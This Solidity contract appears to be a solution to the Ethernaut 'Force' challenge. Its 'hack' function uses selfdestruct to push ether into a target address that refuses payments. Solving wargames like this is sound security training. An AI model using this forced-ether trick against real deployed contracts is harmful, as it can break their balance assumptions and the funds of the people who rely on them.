// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Ethernaut07 {
    function hack(address _address) public payable {
        address payable addr = payable(_address);
        selfdestruct(addr);
    }
}